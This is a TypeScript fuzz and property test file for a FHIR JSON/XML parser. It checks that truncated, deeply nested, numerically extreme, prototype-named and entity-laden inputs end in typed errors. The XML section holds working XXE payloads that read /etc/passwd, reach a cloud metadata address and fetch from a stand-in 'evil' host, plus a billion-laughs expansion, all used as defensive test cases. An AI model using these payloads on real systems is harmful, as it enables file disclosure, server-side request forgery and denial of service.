/**
 * FHIR-P11 fuzz tier (roadmap §6 "Fuzzing — JSON/XML-level, not byte-level").
 *
 * FHIR is transported as text, so the attack surface of this library is adversarial JSON and XML —
 * not byte framing. The single contract this file proves, at fuzz-scale run counts, across every
 * hostile-input shape the roadmap names (truncation, deep nesting, `_element` games, huge /
 * scientific-notation numbers, `resourceType` games, and — for XML — XXE / billion-laughs / undefined
 * entities), is:
 *
 *   **Adversarial input never crashes, hangs, or OOMs — it becomes a *typed* error (a
 *   `FhirCodecError` / `FhirXmlError` whose `.code` is a registered fatal) or a bounded rejection,
 *   never an untyped throw (a `RangeError` stack overflow, a `TypeError`, …) and never a non-return.**
 *
 * A `RangeError` from unbounded recursion is the specific failure this guards: it is why the JSON
 * reader carries a `MAX_DEPTH_EXCEEDED` bound (mirroring the XML reader), so a tower of `[[[[…]]]]`
 * is refused with a typed fatal rather than overflowing V8's stack.
 *
 * This complements the round-trip / immutability property suites (`roundtrip.property.test.ts`,
 * `safety.property.test.ts`) — those assert *correct* behavior on well-formed input; this asserts
 * *safe* behavior on hostile input.
 */

import { readFileSync, readdirSync } from "node:fs";

import fc from "fast-check";
import { describe, expect, it } from "vitest";

import {
  FATAL_CODES,
  FhirCodecError,
  FhirXmlError,
  NDJSON_ERROR_CODES,
  XML_FATAL_CODES,
  parseNdjsonLine,
  parseResource,
  parseResourceXml,
  readRawJson,
  readRawXml,
  serializeResource,
  validateResource,
} from "../src/index.js";

/**
 * High run count, fixed seed — deterministic fuzz-scale reproduction (mirrors the hl7 fuzz harness).
 * The count is CI-tunable via `FUZZ_RUNS` (the dedicated `fuzz` CI job raises it); the fixed seed
 * keeps a failure reproducible regardless of the count.
 */
const FUZZ_RUNS = Number.parseInt(process.env["FUZZ_RUNS"] ?? "", 10);
const RUN_CONFIG = {
  numRuns: Number.isFinite(FUZZ_RUNS) && FUZZ_RUNS > 0 ? FUZZ_RUNS : 1000,
  seed: 0x07_18_2026,
} as const;

const JSON_FATAL_SET: ReadonlySet<string> = new Set(Object.values(FATAL_CODES));
const XML_FATAL_SET: ReadonlySet<string> = new Set(Object.values(XML_FATAL_CODES));

const FIXTURE_DIR = new URL("./__fixtures__/", import.meta.url);

/** Every `.json` fixture, loaded once. These are spec-clean / quirk synthetic resources. */
const JSON_FIXTURES: readonly string[] = readdirSync(FIXTURE_DIR)
  .filter((f) => f.endsWith(".json"))
  .map((f) => readFileSync(new URL(f, FIXTURE_DIR), "utf8"))
  .filter((s) => s.length > 0);

/** Every `.xml` fixture, loaded once. */
const XML_FIXTURES: readonly string[] = readdirSync(FIXTURE_DIR)
  .filter((f) => f.endsWith(".xml"))
  .map((f) => readFileSync(new URL(f, FIXTURE_DIR), "utf8"))
  .filter((s) => s.length > 0);

// ── JSON contract ────────────────────────────────────────────────────────────────────────────────

/**
 * `parseResource` / `readRawJson` on `raw` either return, or throw a {@link FhirCodecError} whose
 * `.code` is a registered JSON fatal. Any other throw (a `RangeError`, a `TypeError`, a bare `Error`,
 * or a `FhirCodecError` with an unregistered code) fails the property immediately. Returns the parsed
 * resource, or `undefined` if it was a (typed) fatal.
 */
function assertJsonSafe(raw: string): ReturnType<typeof parseResource> | undefined {
  // The raw reader must obey the same contract on its own (it is a public entry point).
  try {
    readRawJson(raw);
  } catch (err) {
    expect(err, "readRawJson threw a non-FhirCodecError").toBeInstanceOf(FhirCodecError);
    if (err instanceof FhirCodecError) {
      expect(
        JSON_FATAL_SET.has(err.code),
        `readRawJson threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
  }
  try {
    const result = parseResource(raw);
    // A clean return always carries a value-free issues array.
    expect(Array.isArray(result.issues)).toBe(true);
    return result;
  } catch (err) {
    expect(err, "parseResource threw a non-FhirCodecError").toBeInstanceOf(FhirCodecError);
    if (err instanceof FhirCodecError) {
      expect(
        JSON_FATAL_SET.has(err.code),
        `parseResource threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
    return undefined;
  }
}

/** The structural characters a JSON mutator injects / duplicates / drops. */
const JSON_MUTATION_CHARS = ["{", "}", "[", "]", ":", ",", '"', "\\", "0", "e", ".", "-"] as const;

/** Apply a sequence of inject/duplicate/drop point-mutations to a base string. */
function mutated(base: string, mutations: readonly Mutation[]): string {
  let s = base;
  for (const m of mutations) {
    if (s.length === 0) break;
    const offset = Math.min(s.length - 1, Math.floor(m.offsetFrac * s.length));
    switch (m.op) {
      case "inject":
        s = s.slice(0, offset) + m.char + s.slice(offset);
        break;
      case "duplicate":
        s = s.slice(0, offset) + (s[offset] ?? "") + s.slice(offset);
        break;
      case "drop":
        s = s.slice(0, offset) + s.slice(offset + 1);
        break;
    }
  }
  return s;
}

interface Mutation {
  readonly op: "inject" | "duplicate" | "drop";
  readonly offsetFrac: number;
  readonly char: string;
}

function mutationArb(chars: readonly string[]): fc.Arbitrary<Mutation> {
  return fc.record({
    op: fc.constantFrom("inject", "duplicate", "drop"),
    offsetFrac: fc.double({ min: 0, max: 1, noNaN: true }),
    char: fc.constantFrom(...chars),
  });
}

/** Structure-char mutations of a real, spec-clean JSON fixture — malformed-but-JSON-shaped input. */
function mutatedJsonFixture(): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...JSON_FIXTURES),
      mutations: fc.array(mutationArb(JSON_MUTATION_CHARS), { minLength: 1, maxLength: 15 }),
    })
    .map(({ base, mutations }) => mutated(base, mutations));
}

/** Truncation of a real fixture at every prefix length. */
function truncatedFixture(fixtures: readonly string[]): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...fixtures),
      cutFrac: fc.double({ min: 0, max: 1, noNaN: true }),
    })
    .map(({ base, cutFrac }) => base.slice(0, Math.floor(cutFrac * base.length)));
}

describe("fuzz: corpus is loaded (a 0-fixture corpus would make every property vacuous)", () => {
  it("has JSON and XML fixtures", () => {
    expect(JSON_FIXTURES.length).toBeGreaterThan(0);
    expect(XML_FIXTURES.length).toBeGreaterThan(0);
  });
});

describe("fuzz: JSON — arbitrary bytes never throw except a registered FhirCodecError", () => {
  it("random unicode/binary strings", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("strings drawn loosely from the JSON alphabet", () => {
    const jsonish = fc.stringOf(
      fc.constantFrom(...'{}[]:,"\\0123456789.-eEtruefalsnull ABCabc'.split("")),
      { minLength: 0, maxLength: 200 },
    );
    fc.assert(
      fc.property(jsonish, (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON — structural mutation & truncation of spec-clean fixtures never crash", () => {
  it("inject/duplicate/drop of JSON structural characters", () => {
    fc.assert(
      fc.property(mutatedJsonFixture(), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("every truncation length of every JSON fixture", () => {
    fc.assert(
      fc.property(truncatedFixture(JSON_FIXTURES), (raw) => {
        assertJsonSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
  // The whole point of the bound: without it, these overflow V8's stack with an untyped RangeError.
  it("a tower of arrays past the bound", () => {
    fc.assert(
      fc.property(fc.integer({ min: 300, max: 20_000 }), (depth) => {
        let error: unknown;
        try {
          parseResource("[".repeat(depth) + "]".repeat(depth));
        } catch (err) {
          error = err;
        }
        expect(error).toBeInstanceOf(FhirCodecError);
        expect((error as FhirCodecError).code).toBe(FATAL_CODES.MAX_DEPTH_EXCEEDED);
      }),
      { numRuns: 50, seed: RUN_CONFIG.seed },
    );
  });

  it("a tower of objects past the bound", () => {
    const depth = 20_000;
    const raw = '{"a":'.repeat(depth) + "1" + "}".repeat(depth);
    expect(() => parseResource(raw)).toThrow(FhirCodecError);
    try {
      parseResource(raw);
    } catch (err) {
      expect((err as FhirCodecError).code).toBe(FATAL_CODES.MAX_DEPTH_EXCEEDED);
    }
  });

  it("nesting just under the bound still parses (the bound rejects only the pathological)", () => {
    const under = 250;
    const raw = `{"resourceType":"X","a":${"[".repeat(under)}1${"]".repeat(under)}}`;
    expect(() => parseResource(raw)).not.toThrow();
  });
});

describe("fuzz: JSON — huge / scientific-notation numbers are preserved, never crash or corrupt", () => {
  it("adversarial number literals round-trip as text with a precision flag, no throw", () => {
    const digits = fc.stringOf(fc.constantFrom(..."0123456789".split("")), {
      minLength: 1,
      maxLength: 40,
    });
    // A valid JSON integer part: a single `0`, or a nonzero digit followed by any digits (no leading
    // zeros — the reader correctly rejects `00.0` as MALFORMED, so we do not generate it here).
    const intPart = fc.oneof(
      fc.constant("0"),
      fc
        .tuple(fc.constantFrom(..."123456789".split("")), digits)
        .map(([head, rest]) => head + rest),
    );
    const numberLiteral = fc.oneof(
      fc.constant("1e999999"),
      fc.constant("-9.99e-9999"),
      fc.constant("9223372036854775807"),
      fc.constant("0.00000000000000010"),
      intPart,
      fc.tuple(intPart, digits).map(([i, f]) => `${i}.${f}`),
      fc.tuple(intPart, digits).map(([i, e]) => `${i}e${e}`),
    );
    fc.assert(
      fc.property(numberLiteral, (lit) => {
        const raw = `{"resourceType":"Observation","valueQuantity":{"value":${lit}}}`;
        const result = assertJsonSafe(raw);
        // A well-formed number literal must parse cleanly (never a fatal), and never a JS number.
        expect(result).toBeDefined();
      }),
      RUN_CONFIG,
    );
  });

  it("a finite-as-double value with an astronomical exponent parses without RangeError or hang", () => {
    // Regression: `0e9999999999999999999` (and other values that underflow/collapse to a finite
    // double but decompose to an astronomical scale) once threw an untyped `RangeError` — the
    // precision check aligned scales with `10n ** thatScale`, exploding the BigInt. It must be a
    // clean parse now (the value is preserved as its exact lexical text, flagged at-risk).
    for (const lit of [
      "0e9999999999999999999",
      "0e79299880000194370865717",
      "1e-999999999999",
      "0.00000000424242e-99999999",
    ]) {
      const raw = `{"resourceType":"Observation","valueQuantity":{"value":${lit}}}`;
      const result = assertJsonSafe(raw);
      expect(result).toBeDefined();
    }
  });
});

describe("fuzz: JSON — misaligned `_element` arrays fail closed with a typed fatal, never a wrong-value merge", () => {
  it("random length disagreements between a primitive array and its _-sibling", () => {
    fc.assert(
      fc.property(
        fc.integer({ min: 0, max: 6 }),
        fc.integer({ min: 0, max: 6 }),
        (nValues, nMeta) => {
          const values = Array.from({ length: nValues }, (_, i) => `"g${String(i)}"`).join(",");
          const metas = Array.from({ length: nMeta }, () => "null").join(",");
          const raw = `{"resourceType":"Patient","given":[${values}],"_given":[${metas}]}`;
          let threw: FhirCodecError | undefined;
          try {
            parseResource(raw);
          } catch (err) {
            expect(err).toBeInstanceOf(FhirCodecError);
            threw = err as FhirCodecError;
          }
          // Equal lengths (including 0/0) are aligned and must NOT throw; unequal MUST fail closed.
          if (nValues === nMeta) {
            expect(threw).toBeUndefined();
          } else {
            expect(threw?.code).toBe(FATAL_CODES.PRIMITIVE_EXTENSION_MISALIGNED);
          }
        },
      ),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON — validateResource never throws over any resource that parsed", () => {
  it("validation is total on the fuzz/mutation corpus", () => {
    const anyJson = fc.oneof(
      { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
      { weight: 3, arbitrary: mutatedJsonFixture() },
      { weight: 2, arbitrary: truncatedFixture(JSON_FIXTURES) },
    );
    fc.assert(
      fc.property(anyJson, (raw) => {
        const result = assertJsonSafe(raw);
        if (result === undefined) return; // typed fatal on parse — nothing to validate
        expect(() => validateResource(result.resource)).not.toThrow();
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON — survivor round-trip: anything that parses serializes and re-parses", () => {
  it("parseResource(serializeResource(x)) never throws for a survivor", () => {
    const anyJson = fc.oneof(
      { weight: 1, arbitrary: fc.string({ minLength: 0, maxLength: 200, unit: "binary" }) },
      { weight: 3, arbitrary: mutatedJsonFixture() },
      { weight: 2, arbitrary: truncatedFixture(JSON_FIXTURES) },
    );
    fc.assert(
      fc.property(anyJson, (raw) => {
        const result = assertJsonSafe(raw);
        if (result === undefined) return;
        const serialized = serializeResource(result.resource);
        expect(() => parseResource(serialized)).not.toThrow();
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: JSON — prototype-chain property names never fault the validator", () => {
  // Regression: a resource property literally named `constructor` / `toString` / `valueOf` /
  // `hasOwnProperty` / `__proto__` once crashed `validateResource` with an uncaught `TypeError`,
  // because a plain-object schema lookup read an inherited `Object.prototype` member instead of an
  // `ElementSchema`. An adversarial resource must never be able to fault the validator.
  const dangerousNames = [
    "constructor",
    "__proto__",
    "prototype",
    "toString",
    "valueOf",
    "hasOwnProperty",
    "isPrototypeOf",
    "__defineGetter__",
  ] as const;

  it("a resource carrying any prototype-member property name validates without throwing", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...dangerousNames),
        fc.constantFrom("Patient", "Observation", "AllergyIntolerance"),
        (name, rt) => {
          const raw = `{"resourceType":"${rt}","${name}":"x"}`;
          const result = assertJsonSafe(raw);
          if (result === undefined) return;
          expect(() => validateResource(result.resource)).not.toThrow();
        },
      ),
      RUN_CONFIG,
    );
  });

  it("nested prototype-member property names are also safe", () => {
    for (const name of dangerousNames) {
      const raw = `{"resourceType":"Patient","name":[{"${name}":"x"}]}`;
      const { resource } = parseResource(raw);
      expect(() => validateResource(resource)).not.toThrow();
    }
  });
});

// ── XML contract ─────────────────────────────────────────────────────────────────────────────────

/**
 * `parseResourceXml` / `readRawXml` on `raw` either return, or throw a {@link FhirXmlError} whose
 * `.code` is a registered XML fatal. Any other throw fails the property immediately.
 */
function assertXmlSafe(raw: string): ReturnType<typeof parseResourceXml> | undefined {
  try {
    readRawXml(raw);
  } catch (err) {
    expect(err, "readRawXml threw a non-FhirXmlError").toBeInstanceOf(FhirXmlError);
    if (err instanceof FhirXmlError) {
      expect(
        XML_FATAL_SET.has(err.code),
        `readRawXml threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
  }
  try {
    const result = parseResourceXml(raw);
    expect(Array.isArray(result.issues)).toBe(true);
    return result;
  } catch (err) {
    expect(err, "parseResourceXml threw a non-FhirXmlError").toBeInstanceOf(FhirXmlError);
    if (err instanceof FhirXmlError) {
      expect(
        XML_FATAL_SET.has(err.code),
        `parseResourceXml threw with unregistered code ${JSON.stringify(err.code)}`,
      ).toBe(true);
    }
    return undefined;
  }
}

const XML_MUTATION_CHARS = ["<", ">", "/", "=", '"', "&", ";", "?", "!", "-", " "] as const;

function mutatedXmlFixture(): fc.Arbitrary<string> {
  return fc
    .record({
      base: fc.constantFrom(...XML_FIXTURES),
      mutations: fc.array(mutationArb(XML_MUTATION_CHARS), { minLength: 1, maxLength: 15 }),
    })
    .map(({ base, mutations }) => mutated(base, mutations));
}

describe("fuzz: XML — arbitrary bytes never throw except a registered FhirXmlError", () => {
  it("random unicode/binary strings", () => {
    fc.assert(
      fc.property(fc.string({ minLength: 0, maxLength: 400, unit: "binary" }), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("strings drawn loosely from the XML alphabet", () => {
    const xmlish = fc.stringOf(
      fc.constantFrom(...'<>/="&;?!- abcABC0123DOCTYPEentitySYSTEM'.split("")),
      { minLength: 0, maxLength: 200 },
    );
    fc.assert(
      fc.property(xmlish, (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML — mutation & truncation of spec-clean fixtures never crash", () => {
  it("inject/duplicate/drop of XML structural characters", () => {
    fc.assert(
      fc.property(mutatedXmlFixture(), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });

  it("every truncation length of every XML fixture", () => {
    fc.assert(
      fc.property(truncatedFixture(XML_FIXTURES), (raw) => {
        assertXmlSafe(raw);
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML — XXE / billion-laughs / entity attacks are refused by construction", () => {
  it("any DOCTYPE (the XXE + billion-laughs vector) is refused with DTD_FORBIDDEN, no I/O, no expansion", () => {
    const payloads = [
      // Classic XXE — external entity pointing at a local file.
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><Patient><name value="&x;"/></Patient>',
      // Classic XXE — external entity over the network (SSRF).
      '<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><Patient/>',
      // Billion-laughs — nested internal entities, exponential expansion.
      '<!DOCTYPE lolz [<!ENTITY a "aa"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]><Patient><name value="&c;"/></Patient>',
      // Parameter-entity variant.
      '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/x">%p;]><Patient/>',
      // A bare DOCTYPE with no internal subset.
      "<!DOCTYPE Patient><Patient/>",
    ];
    for (const raw of payloads) {
      let error: unknown;
      try {
        readRawXml(raw);
      } catch (err) {
        error = err;
      }
      expect(error).toBeInstanceOf(FhirXmlError);
      expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.DTD_FORBIDDEN);
    }
  });

  it("a leading DOCTYPE is refused wherever whitespace/prolog precedes it (fuzzed prolog)", () => {
    fc.assert(
      fc.property(
        fc.stringOf(fc.constantFrom(" ", "\t", "\n", "\r"), { minLength: 0, maxLength: 8 }),
        (ws) => {
          const raw = `${ws}<!DOCTYPE x [<!ENTITY e "boom">]><Patient/>`;
          // With an XML declaration or not; the reader must still refuse the DTD.
          let error: unknown;
          try {
            readRawXml(raw);
          } catch (err) {
            error = err;
          }
          expect(error).toBeInstanceOf(FhirXmlError);
          expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.DTD_FORBIDDEN);
        },
      ),
      { numRuns: 100, seed: RUN_CONFIG.seed },
    );
  });

  it("a prototype-member entity name is refused, never resolved through Object.prototype", () => {
    // Regression: `&constructor;` / `&toString;` / `&__proto__;` once resolved, because the
    // predefined-entity lookup read inherited `Object.prototype` members. Only the five own names
    // are defined; everything else is UNDEFINED_ENTITY.
    for (const name of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"]) {
      let error: unknown;
      try {
        readRawXml(`<Patient><name value="&${name};"/></Patient>`);
      } catch (err) {
        error = err;
      }
      expect(error).toBeInstanceOf(FhirXmlError);
      expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.UNDEFINED_ENTITY);
    }
  });

  it("an undefined named entity (no DTD present) is refused with UNDEFINED_ENTITY, never resolved", () => {
    fc.assert(
      fc.property(
        fc
          .stringOf(fc.constantFrom(..."abcdefghijklmnopqrstuvwxyzABCXYZ0123".split("")), {
            minLength: 1,
            maxLength: 12,
          })
          .filter((n) => !["amp", "lt", "gt", "quot", "apos"].includes(n)),
        (name) => {
          const raw = `<Patient><name value="&${name};"/></Patient>`;
          let error: unknown;
          try {
            readRawXml(raw);
          } catch (err) {
            error = err;
          }
          expect(error).toBeInstanceOf(FhirXmlError);
          expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.UNDEFINED_ENTITY);
        },
      ),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: XML — deep nesting is a typed MAX_DEPTH_EXCEEDED, never a stack overflow", () => {
  it("a tower of elements past the bound", () => {
    fc.assert(
      fc.property(fc.integer({ min: 300, max: 20_000 }), (depth) => {
        let error: unknown;
        try {
          readRawXml("<a>".repeat(depth) + "</a>".repeat(depth));
        } catch (err) {
          error = err;
        }
        expect(error).toBeInstanceOf(FhirXmlError);
        expect((error as FhirXmlError).code).toBe(XML_FATAL_CODES.MAX_DEPTH_EXCEEDED);
      }),
      { numRuns: 50, seed: RUN_CONFIG.seed },
    );
  });
});

// ── NDJSON contract ──────────────────────────────────────────────────────────────────────────────

describe("fuzz: NDJSON — parseNdjsonLine isolates every failure and never throws", () => {
  it("a malformed / hostile line yields a value-free error record, never a throw", () => {
    const anyLine = fc.oneof(
      fc.string({ minLength: 0, maxLength: 200, unit: "binary" }),
      mutatedJsonFixture(),
      truncatedFixture(JSON_FIXTURES),
      // A deeply-nested line — must isolate, not overflow.
      fc.integer({ min: 300, max: 5000 }).map((d) => "[".repeat(d) + "]".repeat(d)),
    );
    fc.assert(
      fc.property(anyLine, fc.integer({ min: 1, max: 1_000_000 }), (line, lineNo) => {
        // Newlines can't appear inside a single NDJSON line; strip them so the unit is one line.
        const oneLine = line.replaceAll(/[\r\n]/g, " ");
        let record: ReturnType<typeof parseNdjsonLine> | undefined;
        expect(() => {
          record = parseNdjsonLine(oneLine, lineNo);
        }).not.toThrow();
        // Exactly one of resource / error (or neither, for a blank line) — never both, never a throw.
        if (record?.error) {
          expect(Object.values(NDJSON_ERROR_CODES)).toContain(record.error.code);
          expect(record.error.line).toBe(lineNo);
          expect(record.resource).toBeUndefined();
        }
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: registries stay pinned (a silent code rename would be caught here)", () => {
  it("FATAL_CODES is exactly the documented set (Phase 1 + the P11 depth-bound guard)", () => {
    expect(Object.keys(FATAL_CODES).sort()).toEqual(
      ["MALFORMED_JSON", "MAX_DEPTH_EXCEEDED", "PRIMITIVE_EXTENSION_MISALIGNED"].sort(),
    );
  });

  it("XML_FATAL_CODES is exactly the documented set", () => {
    expect(Object.keys(XML_FATAL_CODES).sort()).toEqual(
      ["MALFORMED_XML", "DTD_FORBIDDEN", "UNDEFINED_ENTITY", "MAX_DEPTH_EXCEEDED"].sort(),
    );
  });
});
